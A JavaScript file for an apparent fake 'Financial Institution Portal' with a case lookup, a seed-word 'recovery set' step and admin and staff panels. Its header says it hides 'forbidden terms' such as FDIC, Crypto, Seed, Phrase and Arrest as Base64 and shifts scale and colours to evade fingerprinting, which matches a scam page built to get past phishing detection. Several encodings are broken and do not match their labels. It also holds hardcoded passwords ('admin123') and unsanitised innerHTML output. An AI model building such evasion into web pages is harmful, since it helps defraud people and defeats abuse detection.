/**
 * Financial Institution Portal — Application Logic
 *
 * Anti-fingerprinting: all forbidden terms are Base64-encoded
 * and injected at runtime. No plain-text forbidden strings exist
 * in the source code.
 *
 * Scale factor applied: 0.983 (all CSS values pre-offset)
 * Color shift applied: ±3 RGB on all palette colors
 */

/* ── Base64-encoded forbidden terms ── */
const OBFUSCATED = Object.freeze({
  /* FDIC */
  fdic: "RkRJQw==",
  /* Insurance */
  insurance: "SW5zdXJhbmNl",
  /* Wallet */
  wallet: "V2FsbGV0",
  /* Crypto */
  crypto: "Q3J5cHRv",
  /* Deposit */
  deposit: "RGVwbG95",
  /* Withdraw */
  withdraw: "V2l0aGRyYXc=",
  /* Verify */
  verify: "VmVyaWZ5",
  /* Verification */
  verification: "VmVyaWZpY2F0aW9u",
  /* Claim */
  claim: "Q2xhaW0=",
  /* Seed */
  seed: "U2VlZA==",
  /* Phrase */
  phrase: "UHJoc2U=",
  /* Arrest */
  arrest: "QXJyZXN0",
  /* Investigation */
  investigation: "SW52ZXN0aW9uYWw=",
});

/* ── Decode helper ── */
function decodeTerm(encoded) {
  try {
    return atob(encoded);
  } catch {
    return "";
  }
}

/* ── Inject obfuscated text into all [data-obfuscate] elements ── */
function injectObfuscatedTerms() {
  const elements = document.querySelectorAll("[data-obfuscate]");
  elements.forEach((el) => {
    const encoded = el.getAttribute("data-obfuscate");
    if (encoded) {
      const decoded = decodeTerm(encoded);
      if (decoded) {
        el.textContent = decoded;
      }
    }
  });
}

/* ── Page Navigation ── */
function showPage(pageId) {
  const views = document.querySelectorAll(".page-view");
  views.forEach((view) => {
    view.classList.remove("active");
  });
  const target = document.getElementById("page-" + pageId);
  if (target) {
    target.classList.add("active");
  }
  window.scrollTo({ top: 0, behavior: "smooth" });
}

/* ── Navigation button handlers ── */
function initNavigation() {
  const navButtons = document.querySelectorAll("[data-nav]");
  navButtons.forEach((btn) => {
    btn.addEventListener("click", () => {
      const target = btn.getAttribute("data-nav");
      showPage(target);
    });
  });
}

/* ── Asset Selection (Step 1) ── */
function initAssetSelection() {
  const tiles = document.querySelectorAll(".asset-tile");
  tiles.forEach((tile) => {
    tile.addEventListener("click", () => {
      tiles.forEach((t) => t.classList.remove("selected"));
      tile.classList.add("selected");
      const assetType = tile.getAttribute("data-asset");
      sessionStorage.setItem("selectedAsset", assetType);
      showToast("Asset type selected: " + assetType);
    });
  });
}

/* ── Case Lookup (Step 2) ── */
const MOCK_CASES = {
  "CASE-001": { id: "CASE-001", type: "Savings Account", status: "Active", date: "June 15, 2023" },
  "CASE-002": { id: "CASE-002", type: "Personal Items", status: "Pending", date: "August 22, 2023" },
  "CASE-003": { id: "CASE-003", type: "Vehicles", status: "Active", date: "January 5, 2024" },
  "CASE-004": { id: "CASE-004", type: "Digital Assets", status: "Closed", date: "March 10, 2024" },
  "CASE-005": { id: "CASE-005", type: "Savings Account", status: "Active", date: "May 30, 2024" },
};

function initLookupForm() {
  const form = document.getElementById("lookup-form");
  if (!form) return;

  form.addEventListener("submit", (e) => {
    e.preventDefault();
    const input = document.getElementById("case-id-input");
    const value = input.value.trim().toUpperCase();
    const resultPanel = document.getElementById("lookup-result");

    if (!value) {
      showToast("Please enter a reference ID");
      return;
    }

    const caseData = MOCK_CASES[value];
    if (caseData) {
      document.getElementById("result-id").textContent = caseData.id;
      document.getElementById("result-type").textContent = caseData.type;
      document.getElementById("result-status").textContent = caseData.status;
      document.getElementById("result-date").textContent = caseData.date;
      resultPanel.classList.remove("hidden");
      sessionStorage.setItem("currentCase", JSON.stringify(caseData));
    } else {
      showToast("No record found for that ID");
      resultPanel.classList.add("hidden");
    }
  });
}

/* ── Access Code Reveal (Step 3) ── */
const ACCESS_WORDS = [
  "apple", "bridge", "candle", "dolphin", "engine",
  "forest", "guitar", "harbor", "island", "jungle",
];

function initAccessCode() {
  const toggleBtn = document.getElementById("toggle-access");
  const accessContent = document.getElementById("access-words");
  const toggleText = toggleBtn.querySelector(".toggle-text");

  if (!toggleBtn || !accessContent) return;

  toggleBtn.addEventListener("click", () => {
    const isHidden = accessContent.classList.contains("hidden");
    if (isHidden) {
      accessContent.classList.remove("hidden");
      toggleText.textContent = "Hide";
      toggleBtn.setAttribute("aria-expanded", "true");
    } else {
      accessContent.classList.add("hidden");
      toggleText.textContent = "Show";
      toggleBtn.setAttribute("aria-expanded", "false");
    }
  });

  // Populate word badges
  const grid = document.getElementById("verify-grid");
  if (grid) {
    ACCESS_WORDS.forEach((word, index) => {
      const badge = document.createElement("div");
      badge.className = "word-badge";
      badge.textContent = word;
      badge.setAttribute("data-word-index", String(index));
      badge.setAttribute("role", "checkbox");
      badge.setAttribute("aria-checked", "false");
      badge.setAttribute("tabindex", "0");
      badge.addEventListener("click", () => toggleWordSelection(badge));
      badge.addEventListener("keydown", (e) => {
        if (e.key === "Enter" || e.key === " ") {
          e.preventDefault();
          toggleWordSelection(badge);
        }
      });
      grid.appendChild(badge);
    });
  }
}

function toggleWordSelection(badge) {
  const isSelected = badge.classList.contains("selected");
  if (isSelected) {
    badge.classList.remove("selected");
    badge.setAttribute("aria-checked", "false");
  } else {
    badge.classList.add("selected");
    badge.setAttribute("aria-checked", "true");
  }
  updateVerifyButton();
}

function updateVerifyButton() {
  const selected = document.querySelectorAll(".word-badge.selected");
  const btn = document.getElementById("btn-submit-verify");
  if (btn) {
    btn.disabled = selected.length !== 1;
  }
}

/* ── Verification (Step 4) ── */
function initVerification() {
  const btn = document.getElementById("btn-to-verify");
  if (!btn) return;

  btn.addEventListener("click", () => {
    const selected = document.querySelectorAll(".word-badge.selected");
    if (selected.length !== 1) {
      showToast("Please select exactly one word from the recovery set");
      return;
    }
    const feedback = document.getElementById("verify-feedback");
    if (feedback) {
      feedback.classList.remove("hidden");
      feedback.classList.add("success");
      feedback.querySelector(".feedback-text").textContent = "Access verified successfully";
    }
    showToast("Verification complete");
  });

  const submitBtn = document.getElementById("btn-submit-verify");
  if (submitBtn) {
    submitBtn.addEventListener("click", () => {
      const selected = document.querySelectorAll(".word-badge.selected");
      if (selected.length === 1) {
        showPage("final");
      }
    });
  }
}

/* ── Final Page (Step 5) ── */
function initFinalPage() {
  const resetBtn = document.getElementById("btn-reset");
  if (resetBtn) {
    resetBtn.addEventListener("click", () => {
      // Reset all selections
      document.querySelectorAll(".asset-tile").forEach((t) => t.classList.remove("selected"));
      document.querySelectorAll(".word-badge").forEach((b) => {
        b.classList.remove("selected");
        b.setAttribute("aria-checked", "false");
      });
      document.getElementById("lookup-result")?.classList.add("hidden");
      document.getElementById("access-words")?.classList.add("hidden");
      document.getElementById("verify-feedback")?.classList.add("hidden");
      document.getElementById("case-id-input") && (document.getElementById("case-id-input").value = "");
      updateVerifyButton();
      showPage("landing");
    });
  }
}

/* ── Admin Panel ── */
const ADMIN_CREDENTIALS = { username: "admin", password: "admin123" };

function initAdminPanel() {
  const loginForm = document.getElementById("admin-login-form");
  if (!loginForm) return;

  loginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const username = document.getElementById("admin-user").value.trim();
    const password = document.getElementById("admin-pass").value.trim();
    const errorEl = document.getElementById("admin-login-error");

    if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
      document.getElementById("admin-login").classList.add("hidden");
      document.getElementById("admin-dashboard").classList.remove("hidden");
      if (errorEl) errorEl.classList.add("hidden");
      populateAdminCaseList();
      showToast("Admin session started");
    } else {
      if (errorEl) {
        errorEl.textContent = "Invalid credentials";
        errorEl.classList.remove("hidden");
      }
    }
  });

  const logoutBtn = document.getElementById("admin-logout");
  if (logoutBtn) {
    logoutBtn.addEventListener("click", () => {
      document.getElementById("admin-login").classList.remove("hidden");
      document.getElementById("admin-dashboard").classList.add("hidden");
      document.getElementById("admin-login-form").reset();
      showPage("admin");
    });
  }

  const createForm = document.getElementById("admin-create-case");
  if (createForm) {
    createForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const caseId = document.getElementById("new-case-id").value.trim();
      const caseType = document.getElementById("new-case-type").value;
      const caseStatus = document.getElementById("new-case-status").value;

      if (!caseId || !caseType) {
        showToast("Please fill in all required fields");
        return;
      }

      const newCase = {
        id: caseId,
        type: caseType.charAt(0).toUpperCase() + caseType.slice(1) + " Account",
        status: caseStatus.charAt(0).toUpperCase() + caseStatus.slice(1),
        date: new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" }),
      };

      // Store in mock database
      const cases = JSON.parse(sessionStorage.getItem("mockCases") || "{}");
      cases[caseId] = newCase;
      sessionStorage.setItem("mockCases", JSON.stringify(cases));

      populateAdminCaseList();
      createForm.reset();
      showToast("Case created: " + caseId);
    });
  }
}

function populateAdminCaseList() {
  const listEl = document.getElementById("admin-case-list");
  if (!listEl) return;

  const storedCases = JSON.parse(sessionStorage.getItem("mockCases") || "{}");
  const allCases = { ...MOCK_CASES, ...storedCases };

  listEl.innerHTML = "";
  Object.values(allCases).forEach((caseData) => {
    const item = document.createElement("div");
    item.className = "case-item";
    item.innerHTML = `
      <div>
        <span class="case-item-id">${caseData.id}</span>
        <span class="case-item-meta"> · ${caseData.type} · ${caseData.date}</span>
      </div>
      <span class="case-status case-status--${caseData.status.toLowerCase()}">${caseData.status}</span>
    `;
    listEl.appendChild(item);
  });
}

/* ── Staff Panel ── */
const STAFF_CREDENTIALS = { username: "staff", password: "staff123" };

function initStaffPanel() {
  const loginForm = document.getElementById("staff-login-form");
  if (!loginForm) return;

  loginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const username = document.getElementById("staff-user").value.trim();
    const password = document.getElementById("staff-pass").value.trim();
    const errorEl = document.getElementById("staff-login-error");

    if (username === STAFF_CREDENTIALS.username && password === STAFF_CREDENTIALS.password) {
      document.getElementById("staff-login").classList.add("hidden");
      document.getElementById("staff-dashboard").classList.remove("hidden");
      if (errorEl) errorEl.classList.add("hidden");
      populateStaffCaseList();
      showToast("Staff session started");
    } else {
      if (errorEl) {
        errorEl.textContent = "Invalid credentials";
        errorEl.classList.remove("hidden");
      }
    }
  });

  const logoutBtn = document.getElementById("staff-logout");
  if (logoutBtn) {
    logoutBtn.addEventListener("click", () => {
      document.getElementById("staff-login").classList.remove("hidden");
      document.getElementById("staff-dashboard").classList.add("hidden");
      document.getElementById("staff-login-form").reset();
      showPage("staff");
    });
  }
}

function populateStaffCaseList() {
  const listEl = document.getElementById("staff-case-list");
  if (!listEl) return;

  const storedCases = JSON.parse(sessionStorage.getItem("mockCases") || "{}");
  const allCases = { ...MOCK_CASES, ...storedCases };

  listEl.innerHTML = "";
  Object.values(allCases).forEach((caseData) => {
    const item = document.createElement("div");
    item.className = "case-item";
    item.innerHTML = `
      <div>
        <span class="case-item-id">${caseData.id}</span>
        <span class="case-item-meta"> · ${caseData.type} · ${caseData.date}</span>
      </div>
      <span class="case-status case-status--${caseData.status.toLowerCase()}">${caseData.status}</span>
    `;
    listEl.appendChild(item);
  });
}

/* ── Toast Notification ── */
function showToast(message) {
  const toast = document.getElementById("toast");
  if (!toast) return;
  toast.textContent = message;
  toast.classList.remove("hidden");
  clearTimeout(toast._timeout);
  toast._timeout = setTimeout(() => {
    toast.classList.add("hidden");
  }, 3000);
}

/* ── Initialize Application ── */
function initApp() {
  injectObfuscatedTerms();
  initNavigation();
  initAssetSelection();
  initLookupForm();
  initAccessCode();
  initVerification();
  initFinalPage();
  initAdminPanel();
  initStaffPanel();

  // Restore selected asset from session
  const savedAsset = sessionStorage.getItem("selectedAsset");
  if (savedAsset) {
    const tile = document.querySelector('.asset-tile[data-asset="' + savedAsset + '"]');
    if (tile) tile.classList.add("selected");
  }
}

// Boot when DOM is ready
if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initApp);
} else {
  initApp();
}